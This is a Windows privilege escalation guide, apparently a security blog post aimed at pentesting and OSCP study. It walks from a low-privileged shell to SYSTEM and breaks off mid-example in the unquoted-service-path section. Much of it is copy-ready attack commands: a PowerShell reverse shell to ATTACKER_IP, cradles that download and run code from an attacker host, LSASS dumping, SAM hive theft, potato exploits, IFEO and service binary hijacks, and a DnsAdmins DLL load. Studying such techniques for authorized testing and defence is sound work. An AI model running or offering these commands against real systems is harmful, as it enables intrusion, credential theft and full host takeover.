---
title: "The Complete Windows Privilege Escalation Guide"
date: 2026-11-12 12:00:00 +0100
categories: [Guides]
tags: [windows, privilege-escalation, pentesting, methodology, winpeas, potato, seimpersonate, token-abuse, services, dll-hijacking, uac-bypass, kernel-exploits, credential-hunting, mimikatz, oscp]
description: "A comprehensive, end-to-end Windows privilege escalation methodology — from a low-privileged foothold to SYSTEM. Every technique explained with prerequisites, tools, commands, expected output, and decision logic for what to do next."
pin: true
toc: true
---

> **Authorized use only:** This guide is intended for authorized penetration testing, CTF challenges, and cybersecurity education. All techniques described here should only be performed against systems you have explicit written authorization to test.
{: .prompt-warning }

## Introduction

You have a shell on a Windows host. It's a low-privileged one — a service account, a web-app user, a standard domain user, maybe `IIS APPPOOL\web`. Privilege escalation is the process of turning that foothold into full control of the machine: `NT AUTHORITY\SYSTEM`, the local `Administrator`, or a privileged service account.

On Windows this almost always comes down to one of a handful of root causes:

- **Over-privileged tokens** — you hold a Windows privilege (like `SeImpersonatePrivilege`) that can be abused to become SYSTEM.
- **Misconfigured services** — a service you can modify, replace, or whose path you can hijack, running as SYSTEM.
- **Weak file / registry ACLs** — something that runs with high privilege reads or executes something you can write to.
- **Stored credentials** — passwords left in files, the registry, memory, or the SAM.
- **Missing patches** — a kernel or component vulnerability with a public exploit.

This guide is organized as a methodology you can run top to bottom. The golden rule of Windows privesc: **enumerate thoroughly before you exploit.** Ninety percent of the work is enumeration; the exploit is usually the last five minutes. Each technique below includes:

- **Prerequisites** — what you need before attempting it
- **How to find it** — the enumeration that tells you it applies
- **Tools and commands** — ready to copy, with placeholders
- **Exploitation** — step by step
- **Decision logic** — what to do next based on what you find

### Key Terminology

| Term | Definition |
|------|-----------|
| **SYSTEM** | `NT AUTHORITY\SYSTEM` — the highest local account on Windows. More powerful than Administrator for most purposes. The usual goal of local privesc. |
| **Integrity Level** | A Windows trust label on processes/tokens: Low, Medium, High, System. Admin users run at Medium until they elevate (UAC) to High. |
| **Token** | An object describing a security context — the user's SID, group SIDs, and privileges. Threads can impersonate tokens. The heart of most Windows privesc. |
| **Privilege** | A named right held by a token (e.g., `SeImpersonatePrivilege`, `SeBackupPrivilege`). Distinct from file permissions. `whoami /priv` lists yours. |
| **SID** | Security Identifier — unique ID for a user/group. Administrators = `S-1-5-32-544`; SYSTEM = `S-1-5-18`. |
| **ACL / ACE** | Access Control List / Entry — the permissions on an object (file, service, registry key). Misconfigured ACLs are a primary privesc vector. |
| **Service** | A background process managed by the Service Control Manager (SCM), often running as SYSTEM. Defined by a binary path, start type, and account. |
| **UAC** | User Account Control — the mechanism that keeps an admin user at Medium integrity until a prompt elevates a process to High. |
| **LSASS** | Local Security Authority Subsystem Service — the process holding cached credentials and hashes in memory. A prime harvesting target. |
| **SAM** | Security Account Manager — the registry hive storing local account password hashes. |
| **DLL Hijacking** | Getting a privileged process to load an attacker-controlled DLL by placing it where the process searches first. |
| **Potato** | A family of exploits (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato, etc.) that abuse `SeImpersonate`/`SeAssignPrimaryToken` to become SYSTEM. |
| **Named Pipe** | An IPC channel. Abused for impersonation — a server impersonates a client that connects, the basis of the "potato" technique. |

### The Privesc Mindset

Before any tool, answer these five questions about your current context:

1. **Who am I?** — `whoami`, `whoami /all`. What user, what groups, what privileges, what integrity level.
2. **What can this user touch?** — Writable files, modifiable services, readable config.
3. **What runs as something higher than me?** — Services, scheduled tasks, auto-starts running as SYSTEM/Admin.
4. **What's already lying around?** — Credentials in files, registry, history, memory.
5. **Is the box patched?** — OS build, hotfixes, exploitable components.

A single `whoami /priv` showing `SeImpersonatePrivilege` can end the engagement in two minutes. Always look there first.

### Attack Flow Overview

```
Phase 0: Foothold & Shell Stabilization
  └─> Get a stable, interactive shell; know your tooling constraints
        └─> Phase 1: Situational Awareness (manual enumeration)
              └─> whoami /all, system info, users, network, processes, services
                    └─> Phase 2: Automated Enumeration
                          └─> winPEAS, Seatbelt, PowerUp, PrivescCheck
                                └─> Phase 3: Token / Privilege Abuse
                                      └─> SeImpersonate (Potatoes), SeBackup, SeDebug, etc.
                                            └─> Phase 4: Service Exploitation
                                                  └─> Unquoted paths, weak perms, DLL hijacking
                                                        └─> Phase 5: Registry & AutoRuns
                                                              └─> AlwaysInstallElevated, autorun ACLs
                                                                    └─> Phase 6: Credential Hunting
                                                                          └─> Files, registry, SAM, LSASS, history
                                                                                └─> Phase 7: Scheduled Tasks
                                                                                      └─> Phase 8: Kernel & Component Exploits
                                                                                            └─> Phase 9: UAC Bypass & Misc
                                                                                                  └─> Phase 10: Post-SYSTEM (loot & persist)
```

---

## Phase 0: Foothold and Shell Stabilization

Before enumerating, make your shell usable. A broken shell wastes hours.

### 0.1 Know Your Shell Type

| Shell | Characteristics | Notes |
|-------|-----------------|-------|
| **cmd.exe** | Classic command prompt | Limited; no history, clunky. |
| **PowerShell** | Rich, object-based | Preferred — scripting, .NET, download cradles. |
| **Meterpreter** | Metasploit session | `getsystem`, `load kiwi`, built-in modules. |
| **Evil-WinRM** | Remote PowerShell (port 5985) | Comes with credentials; upload/download built in. |
| **Web shell** | Via a web app | Often `IIS APPPOOL\...` or `NETWORK SERVICE` — check `whoami /priv`, these frequently have `SeImpersonate`. |

### 0.2 Upgrade a Dumb Shell to PowerShell

```cmd
REM From a cmd shell, drop into PowerShell:
powershell -ep bypass
```

If you only have a non-interactive command-execution primitive (e.g., web RCE), get a proper reverse shell first. Generate one and catch it:

```bash
# On your attack box (listener)
rlwrap nc -lvnp 443

# Common Windows reverse shell one-liner (PowerShell, base64 it for reliability)
# Use revshells.com to generate — pick "PowerShell #3 (Base64)"
```

```powershell
# Nishang / classic PowerShell reverse shell cradle
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()
};
$client.Close()
```

### 0.3 Set Up File Transfer (both directions)

You will constantly move enumeration scripts to the target and loot back. Set up a web server on your attack box:

```bash
# Attacker: serve your tools directory
python3 -m http.server 80
# or an SMB server (handy for Windows)
impacket-smbserver share ./ -smb2support
```

```powershell
# Target (PowerShell) — download
IWR -Uri http://ATTACKER_IP/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
# or
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/winPEASx64.exe','C:\Windows\Temp\wp.exe')
# In-memory execution (no disk write) for scripts:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
```

```cmd
REM Target (cmd) — certutil (classic, often works)
certutil -urlcache -split -f http://ATTACKER_IP/wp.exe C:\Windows\Temp\wp.exe

REM Target — grab a file from the attacker SMB share
copy \\ATTACKER_IP\share\wp.exe C:\Windows\Temp\wp.exe
```

**Where to write files:** `C:\Windows\Temp` is world-writable and usually works. `C:\Users\<you>\AppData\Local\Temp` and the current directory are alternatives. Avoid writing to locations an AV watches closely; `C:\Windows\Temp` draws less attention than `C:\Users\Public`.

**Decision logic:**
- Shell unstable / dies on first command → fix transfer and shell before anything else.
- `powershell` blocked or Constrained Language Mode → fall back to `cmd`-native enumeration and compiled EXEs (winPEAS.exe, SharpUp.exe).
- AV eating your binaries → use obfuscated/compiled-from-source tools, or manual enumeration only.

---

## Phase 1: Situational Awareness (Manual Enumeration)

Even if you plan to run winPEAS, run these first. They're fast, they teach you the box, and they work when automated tools are blocked or flagged.

### 1.1 Who Am I — The Single Most Important Command

**Prerequisites:** Any shell.

```cmd
whoami
whoami /all
whoami /priv
whoami /groups
```

`whoami /all` prints your username, SID, group memberships, and — critically — your **privileges**. Read the privileges table carefully.

**The privileges that mean game over (if "Enabled", and even if "Disabled" you can often enable them):**

| Privilege | What it gives you | Path |
|-----------|-------------------|------|
| **SeImpersonatePrivilege** | Impersonate a client after auth | Potato attacks → SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | Assign primary tokens | Potato attacks → SYSTEM |
| **SeDebugPrivilege** | Debug any process | Dump LSASS, inject into SYSTEM process |
| **SeBackupPrivilege** | Read any file | Steal SAM/SYSTEM/NTDS, read any secret |
| **SeRestorePrivilege** | Write any file | Overwrite service binaries, DLLs |
| **SeTakeOwnershipPrivilege** | Take ownership of objects | Own then rewrite protected files |
| **SeLoadDriverPrivilege** | Load kernel drivers | Load a vulnerable driver → kernel code exec |
| **SeManageVolumePrivilege** | Manage volumes | Gain full control of the filesystem |
| **SeTcbPrivilege** | Act as part of the OS | Craft tokens → SYSTEM |
| **SeCreateTokenPrivilege** | Create arbitrary tokens | Build a SYSTEM token directly |

**Decision logic:**
- See `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` → **jump straight to Phase 3.1 (Potatoes).** This is the most common OSCP/CTF win and the fastest.
- See `SeBackup`/`SeRestore`/`SeTakeOwnership`/`SeDebug`/`SeLoadDriver`/`SeManageVolume` → Phase 3.
- Member of a privileged group (Backup Operators, Server Operators, DnsAdmins, Print Operators, Event Log Readers) → note it, specific abuse paths exist (Phase 3.7).
- Nothing special → continue enumerating; your win is elsewhere.

> If a powerful privilege shows as **Disabled**, that usually doesn't stop you — tools like PrintSpoofer and the potatoes enable the privilege themselves, and for others you can enable it programmatically. "Disabled" ≠ "unavailable."
{: .prompt-tip }

### 1.2 System Information

**Prerequisites:** Any shell.

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
echo %PROCESSOR_ARCHITECTURE%        REM x86 vs AMD64 — matters for exploits/payloads
```

```powershell
# PowerShell equivalents
Get-ComputerInfo | Select OsName, OsVersion, OsArchitecture, CsName
[System.Environment]::OSVersion.Version
```

**What to capture:**
- **OS name + build number** — drives kernel-exploit selection. Note the exact build (e.g., `10.0.17763`).
- **Architecture** (x86/x64) — your payloads and exploits must match.
- **Hotfixes installed** — `systeminfo` lists KBs under "Hotfix(s)". Few or old hotfixes → kernel exploits viable.

**Find missing patches from systeminfo (Windows Exploit Suggester):**

```bash
# Save `systeminfo` output to a file, then on your attack box:
# Modern tool:
python3 wes.py --update
python3 wes.py systeminfo.txt --exploits-only -i "Elevation of Privilege"

# Classic (older targets):
python2 windows-exploit-suggester.py --update
python2 windows-exploit-suggester.py --database <xls> --systeminfo systeminfo.txt
```

**Decision logic:**
- Old build, sparse hotfix list → shortlist kernel exploits (Phase 8). Verify applicability before firing — kernel exploits can BSOD the box.
- Fully patched modern build → kernel exploits unlikely; focus on misconfig and creds.

### 1.3 Users, Groups, and Who Else Is Here

```cmd
REM Local users and groups
net user
net user <USERNAME>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"

REM Who's logged in / sessions
query user
qwinsta

REM Domain context (if joined)
net user /domain
net group /domain
echo %USERDOMAIN% \ %USERNAME%
```

**What to look for:**
- **Other local admins** — accounts you might pivot to by finding their creds.
- **Your own group memberships** — Administrators (already won — just need to bypass UAC), Backup Operators, etc.
- **Active sessions** — another logged-in admin means token/credential theft opportunities.

### 1.4 Network Configuration

```cmd
ipconfig /all
route print
arp -a
netstat -ano                      REM listening ports + owning PID
netstat -ano | findstr LISTENING
```

**What to look for:**
- **Internal-only services** — ports bound to `127.0.0.1` (e.g., `3306`, `5432`, `8080`, a second web app, a DB, a management console). These are invisible externally and often less hardened — a classic local privesc vector. Note the PID and map it to a process/service.
- **Other interfaces / subnets** — relevant for pivoting, but internal services are the privesc gold.

**Decision logic:**
- Service on `127.0.0.1` you didn't expect → investigate it (what is it, who runs it, is it exploitable, any default creds). Port-forward it to yourself if you need a GUI/tooling: `ssh`, `chisel`, or `plink`.

### 1.5 Running Processes

```cmd
tasklist /v
tasklist /svc                     REM maps processes to services
```

```powershell
Get-Process | Select Name, Id, Path
# Map process to the account running it (needs privileges but try):
Get-CimInstance Win32_Process | Select Name, ProcessId, @{N='Owner';E={$_.GetOwner().User}}
```

**What to look for:**
- **Non-standard processes** — third-party software, agents, backup tools, AV/EDR (know what's watching you).
- **Processes running as SYSTEM/Admin** that correspond to something you can influence (a service binary you can replace, a watched folder, a config you can write).
- Know the **AV/EDR** present so you choose tooling that won't get instantly killed.

### 1.6 Installed Software and Patch Level

```cmd
REM Installed programs (both registry views — 32 and 64 bit)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall /s

REM Program Files contents
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion, Publisher
Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Select DisplayName, DisplayVersion
```

**What to look for:**
- **Third-party software with known local-privesc CVEs** — look up each product + version. Common offenders: outdated installers, backup agents, VPN clients, printer software, database servers, "helper" services.
- **Software installed in a writable location** — `C:\` roots, custom folders with weak ACLs.
- **Vulnerable services** that ship with the software (Phase 4).

### 1.7 The Filesystem — Interesting Files and Writable Paths

```cmd
REM Search for juicy filenames across drives (be patient)
dir /s /b C:\*pass* == C:\*cred* == C:\*vnc* == C:\*.config 2>nul
where /r C:\ *.kdbx *.ini *.config *.xml 2>nul

REM Readable drives
wmic logicaldisk get caption,description,providername
```

```powershell
# Files modified by an admin process, or recently changed, are often clues
Get-ChildItem C:\ -Recurse -Include *.config,*.xml,*.ini,*.txt -ErrorAction SilentlyContinue |
  Select FullName, LastWriteTime
```

We cover credential-bearing files exhaustively in Phase 6; here, just note anything that looks interesting and any **directories your user can write to that privileged processes use** — those power service/DLL/scheduled-task attacks.

---

## Phase 2: Automated Enumeration

Manual enumeration teaches you the box; automated tools catch what you'd miss and rank findings. Run at least one, read the output end to end — don't just grep for red.

### 2.1 winPEAS — The Standard

**Prerequisites:** Ability to upload and run a binary or script.

```cmd
REM Compiled (best coverage). Pick the right arch.
winPEASx64.exe
winPEASx86.exe

REM Quieter / targeted runs
winPEASx64.exe quiet
winPEASx64.exe systeminfo userinfo
winPEASx64.exe fast
```

```powershell
# No-binary options
.\winPEAS.bat
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/winPeas.ps1')
```

**How to read it:** winPEAS color-codes findings — **red/yellow highlights = likely vulnerable**. Priority sections:
- "Current Token privileges" — the `whoami /priv` win.
- "Service Information" — unquoted paths, modifiable services, modifiable binaries/registry.
- "Looking for AutoLogon credentials", "Searching known files that can contain creds", "PowerShell history".
- "AlwaysInstallElevated".
- "Scheduled Applications".

### 2.2 Seatbelt and SharpUp (C# / .NET)

```cmd
REM Seatbelt — broad host triage
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe TokenPrivileges

REM SharpUp — privesc-focused (compiled PowerUp)
SharpUp.exe audit
```

### 2.3 PowerUp (PowerShell)

**Prerequisites:** PowerShell, ideally with script execution (`-ep bypass`). Great when binaries are flagged.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Invoke-AllChecks

# Individual checks (also the auto-exploit helpers)
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-UnattendedInstallFile
Get-RegistryAlwaysInstallElevated
Find-ProcessDLLHijack
```

PowerUp not only finds issues — it ships helpers to exploit some directly (`Invoke-ServiceAbuse`, `Write-ServiceBinary`, `Install-ServiceBinary`).

### 2.4 PrivescCheck and Others

```powershell
# PrivescCheck — modern, well-maintained, low-noise
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended

# WinPEAS alternative for leaner environments:
.\Sherlock.ps1          # legacy kernel-exploit checker
.\Watson.exe            # modern missing-patch checker (.NET)
```

**Tool selection cheat sheet:**

| Situation | Use |
|-----------|-----|
| Full triage, binaries allowed | winPEASx64.exe |
| PowerShell only, binaries flagged | PowerUp.ps1 / PrivescCheck.ps1 |
| .NET post-ex (Cobalt/Covenant/Sliver) | SharpUp, Seatbelt |
| Just missing patches | Watson (modern), wesng (offline from systeminfo) |
| Metasploit session | `run post/multi/recon/local_exploit_suggester` |

**Decision logic:** Treat automated output as leads, not gospel. Every "vulnerable" flag must be **verified manually** before you spend time exploiting it — false positives are common, especially around service and file permissions. Cross-reference with Phase 1 findings.

---

## Phase 3: Token and Privilege Abuse

If `whoami /priv` gave you a powerful privilege, this is your fastest path. Each sub-section maps a privilege to its exploitation.

### 3.1 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege — The Potatoes

**This is the single most common Windows privesc on service accounts and web shells.** `IIS APPPOOL\*`, `NT AUTHORITY\NETWORK SERVICE`, `LOCAL SERVICE`, and many SQL/service accounts hold `SeImpersonatePrivilege` by default.

**Prerequisites:**
- `SeImpersonatePrivilege` **or** `SeAssignPrimaryTokenPrivilege` present in `whoami /priv` (Enabled or Disabled — the tools enable it).
- Ability to run a binary (or a compatible in-memory loader).

**The idea:** You trick a SYSTEM-level service into authenticating to a listener you control, then impersonate that SYSTEM token. Pick the tool by Windows version and available services:

| Tool | Best for | Mechanism |
|------|----------|-----------|
| **PrintSpoofer** | Server 2016/2019, Win10 | Abuses the print spooler named pipe. Simple, reliable. |
| **GodPotato** | Broad: 2012–2022, Win8–11 (.NET) | DCOM/RPC. Currently the most universal. |
| **RoguePotato** | 2019/Win10 where JuicyPotato died | Needs an OXID resolver redirect (port 135). |
| **JuicyPotato** | Older: 2012R2/2016, Win10 ≤1803 | Classic DCOM/BITS CLSID abuse. Dead on newer builds. |
| **SweetPotato / JuicyPotatoNG** | Mixed/modern | Bundles multiple techniques. |
| **EfsPotato / SharpEfsPotato** | When others are blocked | Abuses MS-EFSR (lsarpc/efsrpc). |

**PrintSpoofer (try first on 2016/2019/Win10):**

```cmd
REM Run a command as SYSTEM
PrintSpoofer64.exe -i -c cmd                 REM interactive SYSTEM cmd
PrintSpoofer64.exe -c "C:\Windows\Temp\rev.exe"   REM run your reverse shell as SYSTEM

REM Expected: "[+] Found privilege: SeImpersonatePrivilege" then a SYSTEM shell
```

**GodPotato (most universal — needs .NET):**

```cmd
REM Pick the .NET version flag matching the target (.NET 2/3.5/4)
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "C:\Windows\Temp\rev.exe"
```

**RoguePotato (when JuicyPotato is patched and you can reach 135):**

```cmd
REM On attacker: socat redirect so target's OXID resolver hits your fake one
socat tcp-listen:135,reuseaddr,fork tcp:ATTACKER_IP:9999

REM On target:
RoguePotato.exe -r ATTACKER_IP -e "C:\Windows\Temp\rev.exe" -l 9999
```

**JuicyPotato (older boxes only):**

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Windows\Temp\rev.exe" -t * -c {CLSID}
REM Find a working CLSID for the exact OS from the juicy-potato CLSID list.
```

**Metasploit shortcut:** if you're in a Meterpreter session as a service account, `getsystem` tries several of these named-pipe techniques automatically.

**Decision logic:**
- 2016/2019/Win10, Spooler running → **PrintSpoofer**.
- Fails or Spooler disabled → **GodPotato** (check .NET version with `dir C:\Windows\Microsoft.NET\Framework`).
- 2019/Win10 and the above fail, port 135 reachable → **RoguePotato**.
- Old box (≤ Win10 1803 / 2016) → **JuicyPotato**.
- All DCOM-based blocked → **EfsPotato/SharpEfsPotato**.
- Nothing works → verify you truly have the privilege and the right arch; then move on — these are the easy win, not the only one.

### 3.2 SeDebugPrivilege

**Prerequisites:** `SeDebugPrivilege` in your token. Common for some admin-adjacent and backup accounts.

**What it gives you:** The right to open and manipulate any process — including SYSTEM processes. Two main uses:

**(a) Dump LSASS and harvest credentials:**

```cmd
REM Built-in, no tools: create an LSASS minidump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full

REM Get LSASS PID
tasklist /svc | findstr lsass
```

Then parse the dump offline on your attack box with `pypykatz lsa minidump lsass.dmp` or load it into Mimikatz (`sekurlsa::minidump lsass.dmp` → `sekurlsa::logonpasswords`). Recovered admin hash/password → Pass-the-Hash or login.

**(b) Inject into / migrate to a SYSTEM process:**

```cmd
REM psgetsys.ps1 or a C# token-impersonation tool using SeDebug to spawn as SYSTEM
```

```
# Metasploit
meterpreter > migrate -N lsass.exe    # or any SYSTEM process
```

**Decision logic:** SeDebug almost always yields SYSTEM via LSASS dump → credential reuse, or direct injection. If the box has Credential Guard, LSASS secrets may be protected — fall back to injection/migration.

### 3.3 SeBackupPrivilege (and Backup Operators group)

**Prerequisites:** `SeBackupPrivilege`, or membership in **Backup Operators**.

**What it gives you:** The right to **read any file**, bypassing ACLs (for backup purposes). That means you can steal the files needed to recover every local secret.

**Steal the SAM and SYSTEM hives, then extract hashes offline:**

```cmd
REM Method 1: reg save (needs the privilege effective)
reg save HKLM\SAM  C:\Windows\Temp\sam.hive
reg save HKLM\SYSTEM C:\Windows\Temp\system.hive
reg save HKLM\SECURITY C:\Windows\Temp\security.hive
```

```powershell
# Method 2: raw copy via the backup API when files are locked.
# Import the SeBackupPrivilege modules, then:
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Windows\Temp\sam -Overwrite
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Windows\Temp\system -Overwrite
```

```cmd
REM Method 3: diskshadow (snapshot) to read locked files, esp. NTDS.dit on DCs
REM Write a diskshadow script that creates a shadow copy and exposes it as a drive,
REM then robocopy the target file out with /b (backup mode).
diskshadow /s script.txt
robocopy /b E:\Windows\System32\config C:\Windows\Temp SAM SYSTEM
```

Then on the attack box:

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
# On a DC: -ntds ntds.dit -system system.hive LOCAL  → every domain hash
```

**Decision logic:** On a **member server/workstation** → dump SAM for local admin hash → PtH. On a **Domain Controller** → this is domain compromise: grab `NTDS.dit` + `SYSTEM` → secretsdump → every domain credential.

### 3.4 SeRestorePrivilege

**Prerequisites:** `SeRestorePrivilege`.

**What it gives you:** The right to **write any file**, bypassing ACLs. Turn that into code execution as SYSTEM:

- Overwrite a service binary (or a DLL it loads) that runs as SYSTEM, then restart the service.
- Replace a binary invoked by a scheduled task.
- Classic: use it to modify registry (`SeRestore` also allows writing protected registry keys) — e.g., set up `Utilman.exe`/`sethc.exe` (sticky keys) image-hijack, or change an IFEO debugger.

```cmd
REM Example: hijack Image File Execution Options so magnify/utilman launches cmd as SYSTEM
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
REM Then trigger Utilman from the lock screen (Win+U) → SYSTEM cmd.
```

PowerShell `SeRestorePrivilege` helper modules provide `Set-FileSeRestorePrivilege` to write to otherwise-protected paths.

### 3.5 SeTakeOwnershipPrivilege

**Prerequisites:** `SeTakeOwnershipPrivilege`.

**What it gives you:** Take ownership of any securable object. Once you own a file, you can rewrite its DACL and grant yourself full control, then replace it.

```cmd
REM Take ownership of a SYSTEM-run binary, then grant yourself control and replace it
takeown /f "C:\Program Files\VulnApp\service.exe"
icacls "C:\Program Files\VulnApp\service.exe" /grant %USERNAME%:F
copy /y C:\Windows\Temp\evil.exe "C:\Program Files\VulnApp\service.exe"
REM Restart the service (or wait for reboot) → SYSTEM.
```

Good targets: a SYSTEM service's binary, a DLL loaded by a privileged process, or sensitive files (SAM via its on-disk path after taking ownership — though it's locked at runtime; prefer SeBackup for that).

### 3.6 SeLoadDriverPrivilege

**Prerequisites:** `SeLoadDriverPrivilege` (held by Print Operators, among others).

**What it gives you:** Load a kernel driver. Load a **known-vulnerable signed driver** (BYOVD — Bring Your Own Vulnerable Driver) such as `Capcom.sys`, then exploit it for kernel code execution → SYSTEM.

```cmd
REM Register a driver under HKCU (SeLoadDriver lets you load from a non-admin-controlled key)
REM then call NtLoadDriver. Public PoCs (EoPLoadDriver.exe + ExploitCapcom.exe) automate this.
EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys
ExploitCapcom.exe
```

> On modern, patched systems, Microsoft's vulnerable-driver blocklist (HVCI) may prevent loading known-bad drivers. Check the OS build and protections first.
{: .prompt-warning }

### 3.7 Other Powerful Privileges and Groups

**SeManageVolumePrivilege** → with a known PoC (`SeManageVolumeExploit`), obtain full control over `C:\`, then write a DLL that a SYSTEM process loads (e.g., place a malicious `tzres.dll`/`wbemcomn.dll` in a search path) → SYSTEM.

**SeTcbPrivilege / SeCreateTokenPrivilege** → craft a token with SYSTEM/Administrators group membership directly. Rare, but an instant win with the right PoC.

**Privileged local groups worth abusing:**

| Group | Abuse |
|-------|-------|
| **Backup Operators** | Read SAM/SYSTEM (as 3.3) → local admin hash. On a DC, read NTDS → domain. |
| **Server Operators** | Modify/restart services (many run as SYSTEM) → reconfigure binpath → SYSTEM. |
| **Print Operators** | Hold `SeLoadDriverPrivilege` → BYOVD (3.6). |
| **Event Log Readers** | Read Security logs — can expose credentials passed on command lines. |
| **DnsAdmins** | Load a malicious DLL into the DNS service (runs as SYSTEM) via `dnscmd` → SYSTEM/DC. |
| **Hyper-V Administrators** | Various VM-level escapes; context-dependent. |

```cmd
REM Server Operators example: reconfigure a service's binary path, then restart it
sc config <SERVICE> binpath= "C:\Windows\Temp\rev.exe"
sc stop <SERVICE> & sc start <SERVICE>

REM DnsAdmins example (on/against a DC):
dnscmd DC01 /config /serverlevelplugindll \\ATTACKER_IP\share\evil.dll
sc stop dns & sc start dns
```

**Decision logic:** Match the exact privilege/group to its section, grab a current PoC, verify arch and OS build, then execute. Token/privilege abuse is deterministic — if the privilege is really there, the win is reliable (unlike kernel exploits).

---

## Phase 4: Service Exploitation

Windows services commonly run as SYSTEM. If you can influence *what* a service runs — its binary, its path resolution, a DLL it loads, or its configuration — you inherit SYSTEM. This phase is the richest source of misconfiguration privesc.

### 4.1 Enumerating Services

```cmd
REM All services, their state and binary paths
sc query
wmic service get Name,DisplayName,PathName,StartMode,StartName
sc qc <SERVICE>                    REM detailed config incl. BINARY_PATH_NAME and SERVICE_START_NAME
```

```powershell
Get-CimInstance Win32_Service | Select Name, State, StartMode, StartName, PathName | Format-Table -Auto
# Services NOT running from Windows dirs (third-party = more likely weak)
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '*Windows*' } | Select Name, PathName, StartName
```

For each interesting service note: **the account it runs as** (`StartName` = `LocalSystem`? ), **the binary path**, and **the start mode** (can you restart it, or must you wait for reboot?).

### 4.2 Insecure Service Permissions (modifiable service config)

**The vulnerability:** Your user has `SERVICE_CHANGE_CONFIG` (or more) on a service running as SYSTEM. You rewrite its binary path to your payload and restart it.

**How to find it:**

```cmd
REM accesschk (Sysinternals) — the definitive check. Accept EULA with /accepteula.
accesschk.exe /accepteula -uwcqv "%USERNAME%" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <SERVICE>      REM specific service
```

```powershell
# PowerUp finds and can auto-exploit these
Get-ModifiableService
```

Look for `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`, or `WRITE_DAC`/`WRITE_OWNER` granted to your user/Everyone/Authenticated Users/Users.

**Exploitation:**

```cmd
REM 1. Confirm current config and whether you can restart it
sc qc <SERVICE>
sc queryex <SERVICE>

REM 2. Point the binary at your payload (note the space after binpath=)
sc config <SERVICE> binpath= "C:\Windows\Temp\rev.exe"
REM (optionally set to auto so it survives reboot)
sc config <SERVICE> obj= LocalSystem start= auto

REM 3. Restart to trigger
sc stop <SERVICE>
sc start <SERVICE>
```

If you lack restart rights but the service auto-starts, trigger it via reboot (if you can) or wait. PowerUp automates the whole thing:

```powershell
Invoke-ServiceAbuse -Name '<SERVICE>' -Command "net localgroup administrators %USERNAME% /add"
```

**Decision logic:** Can modify config + can restart → immediate SYSTEM. Can modify config but not restart and no auto-start/reboot → park it; revisit if you get a reboot. Prefer a short reverse-shell payload or a `net localgroup administrators` add (simplest, survives) over a long-running binary that the SCM will kill for not being a real service.

### 4.3 Weak Service Binary / Folder Permissions

**The vulnerability:** You can't change the service *config*, but you **can overwrite the service's executable** (or a file in its folder) because the file/folder ACL is weak. On restart, your binary runs as the service account.

**How to find it:**

```cmd
REM Check write access to each service's binary and its directory
accesschk.exe /accepteula -quvw "C:\Program Files\VulnApp\service.exe"
icacls "C:\Program Files\VulnApp\service.exe"
icacls "C:\Program Files\VulnApp"
```

```powershell
Get-ModifiableServiceFile      # PowerUp: finds services whose files you can write
```

Look for `(F)`, `(M)`, `(W)`, or group grants to `Users`/`Everyone`/`Authenticated Users`/your user on the binary or its folder.

**Exploitation:**

```cmd
REM Back up the original, drop your payload in its place, restart
copy "C:\Program Files\VulnApp\service.exe" C:\Windows\Temp\service.exe.bak
copy /y C:\Windows\Temp\rev.exe "C:\Program Files\VulnApp\service.exe"
sc stop <SERVICE> & sc start <SERVICE>
```

If only the *folder* is writable (not the exe), combine with DLL hijacking (4.5) or unquoted-path (4.4), or replace a different file the service loads.

### 4.4 Unquoted Service Paths

**The vulnerability:** A service's binary path contains spaces and is **not wrapped in quotes**. Windows resolves such a path by trying each space-delimited prefix with `.exe` appended. If you can write to an earlier directory in that sequence, your planted EXE runs instead of the intended binary.

Example path: `C:\Program Files\Vuln App\Sub Dir\service.exe` (unquoted). Windows tries, in order:

```
